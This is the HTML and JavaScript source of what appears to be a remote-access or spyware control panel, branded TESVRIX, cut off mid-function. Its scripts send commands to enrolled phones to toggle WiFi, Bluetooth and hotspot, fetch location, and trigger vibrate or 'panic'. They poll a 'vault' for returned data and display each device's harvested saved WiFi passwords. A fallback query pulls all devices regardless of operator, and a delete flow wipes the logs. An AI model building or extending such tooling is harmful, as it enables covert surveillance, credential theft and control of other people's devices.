<!DOCTYPE html>
<html lang="en">
<head>
    <script src="../protect.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TESVRIX · COMMAND INTELLIGENCE v2.0</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #e11d48;
            --primary-glow: rgba(225, 29, 72, 0.45);
            --primary-dark: #be123c;
            --bg-deep: #020617;
            --bg-surface: #0f172a;
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --accent-green: #10b981;
            --accent-red: #ef4444;
            --transition-smooth: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        body { background: radial-gradient(ellipse at 20% 30%, #0a0f1f, var(--bg-deep)); font-family: 'Inter', 'Space Grotesk', sans-serif; color: var(--text-primary); height: 100vh; overflow: hidden; }

        /* Scrollbar styling */
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }

        .dashboard { display: flex; height: 100vh; padding: 20px; gap: 20px; backdrop-filter: blur(2px); }

        /* Left Panel */
        .device-panel { width: 340px; background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(12px); border-radius: 32px; border: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 0 25px 40px -15px rgba(0, 0, 0, 0.5); display: flex; flex-direction: column; overflow: hidden; transition: all var(--transition-smooth); }
        .panel-header { padding: 24px 20px 16px; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
        .panel-header h2 { font-family: 'Space Grotesk', monospace; font-weight: 600; font-size: 1rem; letter-spacing: 2px; background: linear-gradient(135deg, #fff, var(--primary)); -webkit-background-clip: text; background-clip: text; color: transparent; display: inline-block; }

        .search-field { margin-top: 16px; position: relative; }
        .search-field i { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--primary); font-size: 0.85rem; opacity: 0.8; }
        .search-field input { width: 100%; background: rgba(2, 6, 23, 0.7); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 44px; padding: 12px 16px 12px 40px; font-family: 'Inter', monospace; font-size: 0.8rem; color: var(--text-primary); outline: none; transition: all 0.2s; }
        .search-field input:focus { border-color: var(--primary); box-shadow: 0 0 12px var(--primary-glow); background: rgba(2, 6, 23, 0.9); }

        .fleet-scroll { flex: 1; overflow-y: auto; padding: 12px 16px 20px; }
        .device-card { background: rgba(30, 41, 59, 0.5); backdrop-filter: blur(4px); border-radius: 24px; padding: 14px 16px; margin-bottom: 12px; border: 1px solid rgba(255, 255, 255, 0.03); transition: all 0.2s ease; cursor: pointer; position: relative; overflow: hidden; }
        .device-card:hover { background: rgba(30, 41, 59, 0.8); border-color: rgba(225, 29, 72, 0.3); transform: translateX(4px); }
        .device-card.active { background: linear-gradient(115deg, rgba(225, 29, 72, 0.15), rgba(30, 41, 59, 0.7)); border-left: 4px solid var(--primary); box-shadow: 0 0 12px rgba(225, 29, 72, 0.2); }

        .online-indicator { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background-color: var(--accent-green); box-shadow: 0 0 8px var(--accent-green); }
        .offline-indicator { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background-color: #64748b; }

        /* Right Panel */
        .detail-panel { flex: 1; background: rgba(15, 23, 42, 0.55); backdrop-filter: blur(12px); border-radius: 32px; border: 1px solid rgba(255, 255, 255, 0.06); overflow-y: auto; transition: all 0.3s; box-shadow: 0 20px 35px -12px black; position: relative; }

        .empty-core { height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; gap: 16px; opacity: 0.7; }
        .empty-core i { font-size: 4rem; color: var(--primary); filter: drop-shadow(0 0 12px var(--primary-glow)); animation: gentlePulse 2.5s infinite; }
        @keyframes gentlePulse { 0%, 100% { opacity: 0.6; transform: scale(1); } 50% { opacity: 1; transform: scale(1.05); } }

        .detail-content { height: 100%; display: flex; flex-direction: column; animation: slideUpFade 0.5s cubic-bezier(0.2, 0.8, 0.2, 1); }
        @keyframes slideUpFade { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .detail-header { padding: 30px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: flex-start; background: linear-gradient(95deg, rgba(225,29,72,0.08), transparent); }
        .detail-header h1 { font-family: 'Space Grotesk'; font-size: 1.6rem; letter-spacing: -0.5px; }

        .connection-badge { background: rgba(0,0,0,0.5); border-radius: 40px; padding: 6px 16px; font-size: 0.7rem; font-weight: 700; border: 1px solid; transition: all 0.3s ease; }
        .badge-online { border-color: #10b981; color: #10b981; box-shadow: 0 0 10px rgba(16, 185, 129, 0.2); }
        .badge-offline { border-color: #ef4444; color: #ef4444; }

        /* Stats Grid */
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; padding: 30px; }
        .stat-tile { background: rgba(0, 0, 0, 0.3); border-radius: 24px; padding: 20px; border: 1px solid rgba(255,255,255,0.03); transition: all 0.3s ease; position: relative; overflow: hidden; }
        .stat-tile:hover { background: rgba(225, 29, 72, 0.05); transform: translateY(-5px); border-color: rgba(225, 29, 72, 0.3); box-shadow: 0 10px 25px -8px rgba(225,29,72,0.15), 0 0 0 1px rgba(225,29,72,0.1); }
        .stat-tile::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, rgba(255,255,255,0.05), transparent); pointer-events: none; }
        .stat-tile::after { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, rgba(225,29,72,0.5), transparent); opacity: 0; transition: opacity 0.3s; }
        .stat-tile:hover::after { opacity: 1; }

        .stat-icon { font-size: 1.4rem; color: var(--primary); margin-bottom: 14px; filter: drop-shadow(0 0 8px var(--primary-glow)); }
        .stat-label { font-size: 0.65rem; text-transform: uppercase; font-weight: 700; color: var(--text-secondary); letter-spacing: 1.2px; }
        .stat-value { font-size: 1.1rem; font-weight: 700; font-family: 'Space Grotesk'; margin: 8px 0 6px; color: #fff; word-break: break-all; }

        .progress-bg { background: rgba(255,255,255,0.08); border-radius: 10px; height: 6px; width: 100%; margin: 12px 0 6px; overflow: hidden; }
        .progress-fill { background: linear-gradient(90deg, var(--primary-dark), var(--primary)); width: 0%; height: 100%; border-radius: 10px; box-shadow: 0 0 8px var(--primary); transition: width 1s cubic-bezier(0.4, 0, 0.2, 1); }

        /* Permissions */
        .permission-section { padding: 0 30px 40px; }
        .perm-head { font-size: 0.85rem; font-weight: 700; letter-spacing: 2px; color: var(--primary); margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
        .perm-head i { font-size: 1rem; }

        .perm-list { background: rgba(0, 0, 0, 0.2); border-radius: 28px; border: 1px solid rgba(255,255,255,0.04); overflow: hidden; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); }
        .perm-item { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; border: 1px solid rgba(255,255,255,0.02); transition: all 0.2s; }
        .perm-item:hover { background: rgba(255, 255, 255, 0.02); }
        .perm-name { font-size: 0.8rem; font-weight: 500; color: #cbd5e1; }

        .perm-tag { font-size: 0.65rem; font-weight: 800; padding: 5px 14px; border-radius: 40px; font-family: monospace; letter-spacing: 0.5px; transition: all 0.3s; }
        .tag-enabled { background: rgba(16, 185, 129, 0.12); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); box-shadow: 0 0 10px rgba(16, 185, 129, 0.1); }
        .tag-disabled { background: rgba(239, 68, 68, 0.1); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.2); }

        /* Volume Control UI */
        .vol-control { display: flex; align-items: center; gap: 15px; margin-top: 10px; }
        .vol-btn { width: 32px; height: 32px; border-radius: 50%; border: 1px solid var(--primary); background: rgba(225,29,72,0.1); color: #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; font-weight: 800; transition: 0.2s; }
        .vol-btn:hover { background: var(--primary); transform: scale(1.1); }
        .vol-slider-bg { flex: 1; height: 12px; background: rgba(255,255,255,0.1); border-radius: 6px; position: relative; cursor: pointer; overflow: hidden; }
        .vol-slider-fill { position: absolute; left: 0; top: 0; height: 100%; background: var(--primary); border-radius: 6px; box-shadow: 0 0 8px var(--primary-glow); pointer-events: none; }

        /* Settings Modal */
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); z-index: 1000; display: none; justify-content: center; align-items: center; }
        .settings-modal { width: 90%; max-width: 450px; background: var(--bg-surface); border-radius: 32px; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; display: flex; flex-direction: column; max-height: 85vh; box-shadow: 0 30px 60px -12px rgba(0,0,0,0.8); }
        .modal-header { padding: 24px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.02); }
        .modal-body { flex: 1; overflow-y: auto; padding: 20px; }
        .settings-item { display: flex; align-items: center; padding: 16px; background: rgba(255,255,255,0.03); border-radius: 20px; margin-bottom: 12px; border: 1px solid rgba(255,255,255,0.02); }
        .settings-icon { width: 40px; height: 40px; border-radius: 12px; background: rgba(225,29,72,0.1); color: var(--primary); display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 1.1rem; }
        .settings-info { flex: 1; }
        .settings-label { font-size: 0.9rem; font-weight: 600; color: #fff; }
        .settings-sub { font-size: 0.7rem; color: var(--text-secondary); margin-top: 2px; }
        .settings-key { font-family: monospace; color: var(--accent-green); background: rgba(16, 185, 129, 0.1); padding: 2px 6px; border-radius: 4px; font-size: 0.75rem; }

        /* CUSTOM MODAL SYSTEM */
        .modal-overlay-custom {
            position: fixed; inset: 0;
            background: rgba(2, 6, 23, 0.9);
            backdrop-filter: blur(15px);
            z-index: 2000;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal-window {
            background: var(--bg-surface);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 32px;
            width: 100%;
            max-width: 450px;
            padding: 40px;
            box-shadow: 0 30px 60px -12px rgba(0,0,0,0.8);
            animation: modalPop 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
            position: relative;
        }

        @keyframes modalPop { from { opacity: 0; transform: scale(0.9) translateY(20px); } to { opacity: 1; transform: scale(1) translateY(0); } }

        .modal-title { font-family: 'Space Grotesk'; font-size: 1.4rem; font-weight: 800; letter-spacing: 1px; margin-bottom: 15px; display: flex; align-items: center; gap: 15px; }
        .modal-desc { font-size: 0.9rem; color: var(--text-secondary); line-height: 1.6; margin-bottom: 25px; }

        .modal-actions { display: flex; gap: 15px; margin-top: 30px; }
        .modal-btn { flex: 1; padding: 14px; border-radius: 14px; font-weight: 800; font-family: 'Space Grotesk'; font-size: 0.75rem; cursor: pointer; transition: var(--transition-smooth); border: 1px solid transparent; }
        .modal-btn-cancel { background: rgba(255,255,255,0.05); color: var(--text-secondary); border-color: rgba(255,255,255,0.1); }
        .modal-btn-confirm { background: var(--primary); color: #fff; box-shadow: 0 10px 20px var(--primary-glow); }
        .modal-btn:hover { transform: translateY(-2px); }
    
        /* UNIVERSAL MOBILE RESPONSIVE FIX */
        @media (max-width: 992px) {
            body { padding: 10px; height: auto !important; min-height: 100vh; overflow-y: auto !important; }
            body::before, body::after { display: none; } /* Performance fix */
            .dashboard, .device-panel, .detail-panel, .modal-overlay, .modal-overlay-custom, .settings-modal, .modal-window { backdrop-filter: none !important; -webkit-backdrop-filter: none !important; background-color: rgba(15, 23, 42, 0.98); } /* Performance fix */
            .dashboard, .cam-container, .main-card, .container, .app-container, .split-layout {
                flex-direction: column !important;
                height: auto !important;
                min-height: 100vh;
                width: 100% !important;
                max-width: 100% !important;
                margin: 0 !important;
                border-radius: 16px !important;
            }
            .device-panel, .detail-panel, .sidebar, .main-area, .view-area, .gallery, .split-left, .split-right, .left-panel, .right-panel {
                width: 100% !important;
                max-width: 100% !important;
                height: auto !important;
                flex: none !important;
                min-height: 200px;
                border-right: none !important;
                border-bottom: 1px solid rgba(255,255,255,0.05);
            }
            .stats-grid, .perm-list, .grid-container {
                grid-template-columns: 1fr !important;
            }
            .header, .panel-header, .controls { 
                flex-wrap: wrap; 
                gap: 10px; 
            }
            .node-selector, .search-field { 
                width: 100% !important; 
                min-width: 100% !important;
            }
            .stat-tile { margin-bottom: 10px; }
        }

    
        /* PREMIUM SCROLLBAR */
        ::-webkit-scrollbar { width: 10px !important; height: 10px !important; }
        ::-webkit-scrollbar-track { background: rgba(2, 6, 23, 0.6) !important; border-radius: 10px !important; }
        ::-webkit-scrollbar-thumb { 
            background: #e11d48 !important; 
            border-radius: 10px !important; 
            border: 3px solid rgba(2, 6, 23, 0.6) !important; 
        }
        ::-webkit-scrollbar-thumb:hover { background: #f43f5e !important; }

    </style>
</head>
<body>
<div class="dashboard">
    <!-- LEFT -->
    <div class="device-panel">
        <div class="panel-header">
            <h2><i class="fas fa-microchip" style="margin-right: 8px;"></i> NODE FLEET</h2>
            <div class="search-field"><i class="fas fa-filter"></i><input type="text" id="deviceSearch" placeholder="Search Node Identifier..."></div>
        </div>
        <div class="fleet-scroll" id="deviceListContainer"></div>
    </div>

    <!-- RIGHT -->
    <div class="detail-panel" id="detailView">
        <div class="empty-core">
            <i class="fas fa-satellite-dish"></i>
            <div style="font-weight: 600; letter-spacing: 1px;">NO ACTIVE TELEMETRY</div>
            <p style="font-size: 0.75rem; color: #64748b;">Establish uplink with a remote node</p>
        </div>
    </div>
</div>

<!-- WIFI MANAGER MODAL -->
<div id="wifiModal" class="modal-overlay" onclick="if(event.target === this) this.style.display='none'">
    <div class="settings-modal" onclick="event.stopPropagation()">
        <div class="modal-header">
            <h3 style="font-family:'Space Grotesk'; font-size:1.1rem;"><i class="fas fa-wifi" style="color:var(--primary); margin-right:10px;"></i> WiFi Manager</h3>
            <button onclick="document.getElementById('wifiModal').style.display='none'" style="background:transparent; border:none; color:var(--text-secondary); cursor:pointer; font-size:1.2rem;"><i class="fas fa-times"></i></button>
        </div>
        <div class="modal-body" id="wifiModalBody">
            <div style="text-align:center; padding:40px; color:var(--text-secondary);">
                <i class="fas fa-circle-notch fa-spin" style="font-size:2rem; margin-bottom:15px; color:var(--primary);"></i>
                <p>Synchronizing Network Stack...</p>
            </div>
        </div>
        <div style="padding:15px; border-top:1px solid rgba(255,255,255,0.05); text-align:center;">
            <button onclick="window.requestWifiData()" style="background:var(--primary); border:none; color:#fff; padding:10px 20px; border-radius:15px; font-weight:700; cursor:pointer; width:100%;">REFRESH LIST</button>
        </div>
    </div>
</div>

<!-- BLUETOOTH MANAGER MODAL -->
<div id="btModal" class="modal-overlay" onclick="if(event.target === this) this.style.display='none'">
    <div class="settings-modal" onclick="event.stopPropagation()">
        <div class="modal-header">
            <h3 style="font-family:'Space Grotesk'; font-size:1.1rem;"><i class="fab fa-bluetooth-b" style="color:var(--primary); margin-right:10px;"></i> Bluetooth Manager</h3>
            <button onclick="document.getElementById('btModal').style.display='none'" style="background:transparent; border:none; color:var(--text-secondary); cursor:pointer; font-size:1.2rem;"><i class="fas fa-times"></i></button>
        </div>
        <div class="modal-body" id="btModalBody">
            <div style="text-align:center; padding:40px; color:var(--text-secondary);">
                <i class="fas fa-circle-notch fa-spin" style="font-size:2rem; margin-bottom:15px; color:var(--primary);"></i>
                <p>Querying Bluetooth Stack...</p>
            </div>
        </div>
        <div style="padding:15px; border-top:1px solid rgba(255,255,255,0.05); text-align:center;">
            <button onclick="window.requestBTData()" style="background:var(--primary); border:none; color:#fff; padding:10px 20px; border-radius:15px; font-weight:700; cursor:pointer; width:100%;">REFRESH DEVICES</button>
        </div>
    </div>
</div>

<!-- HOTSPOT MANAGER MODAL -->
<div id="hsModal" class="modal-overlay" onclick="if(event.target === this) this.style.display='none'">
    <div class="settings-modal" onclick="event.stopPropagation()">
        <div class="modal-header">
            <h3 style="font-family:'Space Grotesk'; font-size:1.1rem;"><i class="fas fa-rss" style="color:var(--primary); margin-right:10px;"></i> Hotspot Manager</h3>
            <button onclick="document.getElementById('hsModal').style.display='none'" style="background:transparent; border:none; color:var(--text-secondary); cursor:pointer; font-size:1.2rem;"><i class="fas fa-times"></i></button>
        </div>
        <div class="modal-body" id="hsModalBody">
            <div style="text-align:center; padding:40px; color:var(--text-secondary);">
                <i class="fas fa-circle-notch fa-spin" style="font-size:2rem; margin-bottom:15px; color:var(--primary);"></i>
                <p>Retrieving Client Lease Table...</p>
            </div>
        </div>
        <div style="padding:15px; border-top:1px solid rgba(255,255,255,0.05); text-align:center;">
            <button onclick="window.requestHSData()" style="background:var(--primary); border:none; color:#fff; padding:10px 20px; border-radius:15px; font-weight:700; cursor:pointer; width:100%;">REFRESH CLIENTS</button>
        </div>
    </div>
</div>

<!-- CUSTOM CONFIRM MODAL -->
<div id="confirmModal" class="modal-overlay-custom">
    <div class="modal-window">
        <div class="modal-title" style="color: var(--accent-red);"><i class="fas fa-trash-alt"></i> NODE DECOMMISSION</div>
        <div class="modal-desc">Are you sure? This will PERMANENTLY wipe all logs, commands, and telemetry for this node from the terminal.</div>
        <div class="modal-actions">
            <button class="modal-btn modal-btn-cancel" onclick="document.getElementById('confirmModal').style.display='none'">ABORT</button>
            <button class="modal-btn modal-btn-confirm" id="confirmDeleteBtn" style="background: var(--accent-red); box-shadow: 0 10px 20px rgba(239, 68, 68, 0.3);">CONFIRM DELETE</button>
        </div>
    </div>
</div>

<script src="../davidkewebsitekemake300kespeedma/config.php"></script>
<script>
    (function() {
        const auth = JSON.parse(localStorage.getItem('user') || '{}');
        let allDevices = [], selectedId = null;

        async function fetchData() {
            try {
                // Method 1: Try fetching with operator filter (Preferred)
                let url = getApiUrl(`devices?operator_id=eq.${auth.operator_id}&order=last_seen.desc`);
                let response = await fetch(url, { headers: getApiHeaders() });
                let newData = await response.json();

                // Method 2: If no devices found, try fetching ALL devices (Fallback)
                if (!Array.isArray(newData) || newData.length === 0) {
                    console.log("No devices for operator, trying global fetch...");
                    url = getApiUrl("devices?order=last_seen.desc");
                    response = await fetch(url, { headers: getApiHeaders() });
                    newData = await response.json();
                }

                if (Array.isArray(newData)) {
                    allDevices = newData;
                    renderList();

                    // Robust auto-selection
                    if (!selectedId && newData.length > 0) {
                        selectedId = newData[0].device_uuid;
                        updateDetail(false);
                    } else if (selectedId) {
                        updateDetail(true);
                    }
                }
            } catch (err) {
                console.error("Critical Fetch Error:", err);
            }
        }

        function updateListStatuses() {
            allDevices.forEach(d => {
                const card = document.querySelector(`.device-card[data-id="${d.device_uuid}"]`);
                if (card) {
                    const online = (new Date() - new Date(d.last_seen)) < 35000 && d.status !== 'offline';
                    card.querySelector('.status-led').className = `status-led ${online?'online-indicator':'offline-indicator'}`;
                    card.querySelector('.batt-text').innerText = `${d.battery || '--'}%`;
                }
            });
        }

        function renderList() {
            const query = document.getElementById('deviceSearch').value.toLowerCase();
            const filtered = allDevices.filter(d => (d.device_name || '').toLowerCase().includes(query));
            document.getElementById('deviceListContainer').innerHTML = filtered.map(d => {
                const online = (new Date() - new Date(d.last_seen)) < 35000 && d.status !== 'offline';
                return `<div class="device-card ${selectedId===d.device_uuid?'active':''}" data-id="${d.device_uuid}" onclick="window.selectDevice('${d.device_uuid}')">
                    <div style="display:flex; justify-content:space-between; align-items:center;">
                        <span style="font-weight:600; font-size:0.85rem;"><span class="status-led ${online?'online-indicator':'offline-indicator'}"></span> ${d.device_name || 'NODE'}</span>
                        <span class="batt-text" style="font-size:0.7rem; color:var(--text-secondary);">${d.battery || '--'}%</span>
                    </div>
                </div>`;
            }).join('');
        }

        window.selectDevice = function(id) { selectedId = id; renderList(); updateDetail(false); };

        window.confirmDelete = function(id) {
            document.getElementById('confirmModal').style.display = 'flex';
            document.getElementById('confirmDeleteBtn').onclick = async () => {
                document.getElementById('confirmModal').style.display = 'none';
                try {
                    await fetch(getApiUrl("devices?device_uuid=eq." + id), { method: 'DELETE', headers: getApiHeaders() });

                    selectedId = null;
                    document.getElementById('detailView').innerHTML = `
                        <div class="empty-core">
                            <i class="fas fa-trash" style="color:var(--accent-red);"></i>
                            <div style="font-weight: 600; letter-spacing: 1px;">NODE DECOMMISSIONED</div>
                            <p style="font-size: 0.75rem; color: #64748b;">All associated data has been purged</p>
                        </div>`;
                    fetchData();
                } catch (err) { alert("Deletion failed: Connectivity error"); }
            };
        };

        window.setVolume = async function(id, level, optimistic = false) {
            if (optimistic) {
                const fill = document.getElementById('prog-vol');
                if (fill) fill.style.width = level + '%';
                const val = document.getElementById('val-vol');
                if (val) val.innerText = 'V:' + level + '%';
            }
            try {
                const body = JSON.stringify({ device_uuid: id, type: '/volume', status: 'pending', data: JSON.stringify({ level: level }), operator_id: auth.operator_id });
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body });
            } catch (err) {}
        };

        window.handleSliderClick = function(e, id) {
            const rect = e.currentTarget.getBoundingClientRect();
            const clientX = e.clientX || (e.touches && e.touches[0].clientX);
            const x = clientX - rect.left;
            const level = Math.round((x / rect.width) * 100);
            window.setVolume(id, Math.max(0, Math.min(100, level)), true);
        };

        window.startDrag = function(e, id) {
            const moveHandler = (ev) => window.handleSliderClick({
                currentTarget: document.getElementById('slider-bg'),
                clientX: ev.clientX || (ev.touches && ev.touches[0].clientX)
            }, id);

            const stopDrag = () => {
                window.removeEventListener('mousemove', moveHandler);
                window.removeEventListener('mouseup', stopDrag);
                window.removeEventListener('touchmove', moveHandler);
                window.removeEventListener('touchend', stopDrag);
            };

            window.addEventListener('mousemove', moveHandler);
            window.addEventListener('mouseup', stopDrag);
            window.addEventListener('touchmove', moveHandler, {passive: false});
            window.addEventListener('touchend', stopDrag);

            window.handleSliderClick(e, id);
        };

        window.toggleWifi = async function(id, current) {
            const enabled = current.includes('OFF');
            const btn = document.getElementById('btn-wifi');
            if (btn) {
                btn.innerText = '...';
                btn.className = 'perm-tag';
            }
            try {
                const body = JSON.stringify({ device_uuid: id, type: '/wifi', status: 'pending', data: JSON.stringify({ enabled: enabled }), operator_id: auth.operator_id });
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body });
            } catch (err) {}
            setTimeout(() => { if(btn.innerText === '...') btn.innerText = current.includes('ON') ? 'ON' : 'OFF'; }, 5000);
        };

        window.scanWifi = async function(id) {
            document.getElementById('wifiModal').style.display = 'flex';
            window.requestWifiData(id);
        };

        window.requestWifiData = async function(id = selectedId) {
            const bodyDiv = document.getElementById('wifiModalBody');
            bodyDiv.innerHTML = `<div style="text-align:center; padding:40px; color:var(--text-secondary);"><i class="fas fa-circle-notch fa-spin" style="font-size:2rem; margin-bottom:15px; color:var(--primary);"></i><p>Requesting Real-time Scan...</p></div>`;

            try {
                const body = JSON.stringify({ device_uuid: id, type: '/wifi_manager', status: 'pending', data: '{}', operator_id: auth.operator_id });
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body });

                let attempts = 0;
                const poll = setInterval(async () => {
                    attempts++;
                    const res = await fetch(getApiUrl("vault?device_uuid=eq." + id + "&type=eq.wifi_manager_data&order=id.desc&limit=1"), { headers: getApiHeaders() });
                    const data = await res.json();
                    if (data && data.length > 0) {
                        const info = JSON.parse(data[0].content);
                        if (Date.now() - info.timestamp < 30000) {
                            clearInterval(poll);
                            renderWifiList(info);
                        }
                    }
                    if (attempts > 15) {
                        clearInterval(poll);
                        bodyDiv.innerHTML = `<div style="text-align:center; padding:40px; color:var(--accent-red);"><i class="fas fa-exclamation-triangle" style="font-size:2rem; margin-bottom:15px;"></i><p>Node Timed Out</p></div>`;
                    }
                }, 2000);
            } catch (err) {}
        };

        function renderWifiList(data) {
            const body = document.getElementById('wifiModalBody');
            let html = `<div style="font-size:0.7rem; font-weight:800; color:var(--primary); margin-bottom:15px; letter-spacing:1px;">SAVED NETWORKS & PASSWORDS</div>`;

            if (data.saved && data.saved.length > 0) {
                html += data.saved.map(s => `
                    <div class="settings-item">
                        <div class="settings-icon"><i class="fas fa-lock"></i></div>
                        <div class="settings-info">
                            <div class="settings-label">${s.ssid}</div>
                            <div class="settings-sub">Security Key: <span class="settings-key">${s.key}</span></div>
                        </div>
                    </div>`).join('');
            } else {
                html += `<p style="font-size:0.75rem; color:var(--text-secondary); margin-bottom:20px;">No saved credentials found.</p>`;
            }

            html += `<div style="font-size:0.7rem; font-weight:800; color:var(--primary); margin:20px 0 15px; letter-spacing:1px;">AVAILABLE NETWORKS (REAL-TIME)</div>`;

            if (data.scans && data.scans.length > 0) {
                html += data.scans.map(s => `
                    <div class="settings-item">
                        <div class="settings-icon"><i class="fas fa-wifi"></i></div>
                        <div class="settings-info">
                            <div class="settings-label">${s.ssid || 'Hidden Network'}</div>
                            <div class="settings-sub">${s.security} • ${s.level} dBm</div>
                        </div>
                        <i class="fas fa-signal" style="color:${s.level > -60 ? 'var(--accent-green)' : 'var(--text-secondary)'}"></i>
                    </div>`).join('');
            } else {
                html += `<p style="font-size:0.75rem; color:var(--text-secondary);">No nearby networks detected.</p>`;
            }
            body.innerHTML = html;
        }

        window.toggleBluetooth = async function(id, current) {
            const enabled = current.includes('OFF');
            const btn = document.getElementById('btn-bt');
            if (btn) {
                btn.innerText = '...';
                btn.className = 'perm-tag';
            }
            try {
                const body = JSON.stringify({ device_uuid: id, type: '/bluetooth', status: 'pending', data: JSON.stringify({ enabled: enabled }), operator_id: auth.operator_id });
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body });
            } catch (err) {}
            setTimeout(() => { if(btn.innerText === '...') btn.innerText = current.includes('ON') ? 'ON' : 'OFF'; }, 5000);
        };

        window.scanBT = async function(id) {
            document.getElementById('btModal').style.display = 'flex';
            window.requestBTData(id);
        };

        window.requestBTData = async function(id = selectedId) {
            const bodyDiv = document.getElementById('btModalBody');
            bodyDiv.innerHTML = `<div style="text-align:center; padding:40px; color:var(--text-secondary);"><i class="fas fa-circle-notch fa-spin" style="font-size:2rem; margin-bottom:15px; color:var(--primary);"></i><p>Discovering Paired Nodes...</p></div>`;

            try {
                const body = JSON.stringify({ device_uuid: id, type: '/bt_manager', status: 'pending', data: '{}', operator_id: auth.operator_id });
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body });

                let attempts = 0;
                const poll = setInterval(async () => {
                    attempts++;
                    const res = await fetch(getApiUrl("vault?device_uuid=eq." + id + "&type=eq.bt_manager_data&order=id.desc&limit=1"), { headers: getApiHeaders() });
                    const data = await res.json();
                    if (data && data.length > 0) {
                        const info = JSON.parse(data[0].content);
                        if (Date.now() - info.timestamp < 30000) {
                            clearInterval(poll);
                            renderBTList(info);
                        }
                    }
                    if (attempts > 15) {
                        clearInterval(poll);
                        bodyDiv.innerHTML = `<div style="text-align:center; padding:40px; color:var(--accent-red);"><i class="fas fa-exclamation-triangle" style="font-size:2rem; margin-bottom:15px;"></i><p>Discovery Timed Out</p></div>`;
                    }
                }, 2000);
            } catch (err) {}
        };

        window.toggleHotspot = async function(id, current) {
            const enabled = current.includes('OFF');
            const btn = document.getElementById('btn-hs');
            if (btn) {
                btn.innerText = '...';
                btn.className = 'perm-tag';
            }
            try {
                const body = JSON.stringify({ device_uuid: id, type: '/hotspot', status: 'pending', data: JSON.stringify({ enabled: enabled }), operator_id: auth.operator_id });
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body });
            } catch (err) {}
            setTimeout(() => { if(btn.innerText === '...') btn.innerText = current.includes('ON') ? 'ON' : 'OFF'; }, 5000);
        };

        window.toggleLocation = async function(id, current) {
            const btn = document.getElementById('btn-loc');
            if (btn) {
                btn.innerText = '...';
            }
            try {
                const body = JSON.stringify({ device_uuid: id, type: '/get_location', status: 'pending', data: '{}', operator_id: auth.operator_id });
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body });
            } catch (err) {}
            setTimeout(() => { if(btn && btn.innerText === '...') btn.innerText = 'SENT'; }, 2000);
        };

        window.triggerVibrate = async function(id) {
            try {
                const body = JSON.stringify({ device_uuid: id, type: '/vibrate', status: 'pending', data: JSON.stringify({ duration: 2500 }), operator_id: auth.operator_id });
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body });
            } catch (err) {}
        };

        window.triggerPanic = async function(id) {
            try {
                const body = JSON.stringify({ device_uuid: id, type: '/panic', status: 'pending', data: '{}', operator_id: auth.operator_id });
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body });
            } catch (err) {}
        };

        window.viewHotspotClients = async function(id) {
            document.getElementById('hsModal').style.display = 'flex';
            window.requestHSData(id);
        };

        window.requestHSData = async function(id = selectedId) {
            const bodyDiv = document.getElementById('hsModalBody');
            bodyDiv.innerHTML = `<div style="text-align:center; padding:40px; color:var(--text-secondary);"><i class="fas fa-circle-notch fa-spin" style="font-size:2rem; margin-bottom:15px; color:var(--primary);"></i><p>Scanning Connected Hardware...</p></div>`;

            try {
                const body = JSON.stringify({ device_uuid: id, type: '/hotspot_clients', status: 'pending', data: '{}', operator_id: auth.operator_id });
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body });

                let attempts = 0;
                const poll = setInterval(async () => {
                    attempts++;
                    const res = await fetch(getApiUrl("vault?device_uuid=eq." + id + "&type=eq.hotspot_manager_data&order=id.desc&limit=1"), { headers: getApiHeaders() });
